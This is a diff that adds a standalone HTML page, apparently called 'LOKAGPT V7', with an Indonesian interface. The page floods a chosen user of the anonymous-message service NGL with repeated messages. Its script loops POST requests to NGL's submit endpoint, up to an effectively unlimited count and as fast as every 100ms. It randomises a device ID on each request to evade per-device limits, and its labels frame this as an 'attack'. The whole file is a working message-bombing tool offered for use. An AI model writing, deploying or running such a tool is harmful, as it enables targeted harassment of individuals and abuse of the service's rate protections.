@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOKAGPT V7 - GITHUB EDITION</title>
+    <style>
+        body { font-family: 'Courier New', monospace; background: #050505; color: #00ff00; text-align: center; padding: 20px; }
+        .card { background: #111; border: 2px solid #00ff00; padding: 30px; border-radius: 20px; max-width: 450px; margin: auto; box-shadow: 0 0 30px rgba(0, 255, 0, 0.3); }
+        h2 { text-shadow: 0 0 10px #00ff00; letter-spacing: 5px; color: #00ff00; }
+        input, select, button { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #00ff00; background: #000; color: #00ff00; font-weight: bold; outline: none; }
+        .btn-gas { background: #ff0000; color: #fff; border: none; font-size: 20px; cursor: pointer; transition: 0.3s; }
+        .btn-gas:hover { background: #b30000; box-shadow: 0 0 20px #ff0000; }
+        .btn-stop { background: #ffcc00; color: #000; display: none; cursor: pointer; border: none; }
+        .stats { display: flex; justify-content: space-around; margin: 20px 0; }
+        .box { padding: 15px; border-radius: 10px; width: 40%; border: 1px solid #333; }
+        .success { color: #00ff00; border-color: #00ff00; background: rgba(0, 255, 0, 0.1); }
+        .failed { color: #ff0000; border-color: #ff0000; background: rgba(255, 0, 0, 0.1); }
+        #log { font-size: 12px; color: #888; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>LOKAGPT V7 🤖</h2>
+        <input type="text" id="target" placeholder="USERNAME / LINK NGL">
+        <input type="text" id="msg" placeholder="PESAN BOM LU">
+        <input type="text" id="total" placeholder="JUMLAH (00 = UNLIMITED)">
+        <select id="speed">
+            <option value="1500">STEALTH (1.5s)</option>
+            <option value="1000">NORMAL (1s)</option>
+            <option value="500">FAST (500ms)</option>
+            <option value="100">TURBO (100ms) 🥵</option>
+        </select>
+        <div class="stats">
+            <div class="box success">SUCCESS<br><span id="sc">0</span></div>
+            <div class="box failed">FAILED<br><span id="fc">0</span></div>
+        </div>
+        <button id="btnGas" class="btn-gas" onclick="startAttack()">GAS ATTACK! 😈</button>
+        <button id="btnStop" class="btn-stop" onclick="stopAttack()">STOP! 🛑</button>
+        <div id="log">SYSTEM READY...</div>
+    </div>
+
+    <script>
+        let isRunning = false;
+        let successCount = 0;
+        let failedCount = 0;
+
+        async function startAttack() {
+            const targetInput = document.getElementById('target').value;
+            const message = document.getElementById('msg').value;
+            const total = document.getElementById('total').value;
+            const delay = parseInt(document.getElementById('speed').value);
+
+            if (!targetInput || !message) return alert('Target/Pesan kaga boleh kosong! 😹');
+
+            const username = targetInput.split('/').pop().trim();
+            isRunning = true;
+            successCount = 0;
+            failedCount = 0;
+            updateUI();
+
+            document.getElementById('btnGas').disabled = true;
+            document.getElementById('btnStop').style.display = 'block';
+            document.getElementById('log').innerText = "ATTACKING: " + username;
+
+            const limit = (total === "00" || total === "0") ? 999999 : parseInt(total);
+
+            for (let i = 0; i < limit; i++) {
+                if (!isRunning) break;
+
+                const deviceId = btoa(Math.random().toString()).substring(0, 15);
+                
+                try {
+                    const response = await fetch('https://ngl.link/api/submit', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                        },
+                        body: new URLSearchParams({
+                            'username': username,
+                            'question': message,
+                            'deviceId': deviceId,
+                        })
+                    });
+
+                    if (response.ok) {
+                        successCount++;
+                    } else {
+                        failedCount++;
+                    }
+                } catch (error) {
+                    failedCount++;
+                }
+
+                updateUI();
+                await new Promise(resolve => setTimeout(resolve, delay + Math.random() * 50));
+            }
+            stopAttack();
+        }
+
+        function stopAttack() {
+            isRunning = false;
+            document.getElementById('btnGas').disabled = false;
+            document.getElementById('btnStop').style.display = 'none';
+            document.getElementById('log').innerText = "ATTACK STOPPED. 😹";
+        }
+
+        function updateUI() {
+            document.getElementById('sc').innerText = successCount;
+            document.getElementById('fc').innerText = failedCount;
+        }
+    </script>
+</body>
+</html>
